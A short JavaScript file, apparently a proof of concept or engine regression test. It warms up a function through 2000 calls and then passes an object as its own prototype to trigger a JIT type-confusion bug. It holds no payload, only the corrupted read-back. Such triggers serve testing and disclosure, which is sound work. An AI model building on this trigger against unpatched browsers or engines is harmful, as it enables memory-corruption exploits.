function opt(o, proto, value) {
	o.b = 0xbeef;
	let tmp = {__proto__: proto};
	o.a = value;
}

function main() {
	for (let i = 0; i < 2000; i++) {
		let o = {a: 1, b: 2};
		opt(o, {}, {});
	}
	let o = {a: 0x1234, b: 0x5678};
	opt(o, o, 0xdead);
	print(o.a);
}

main();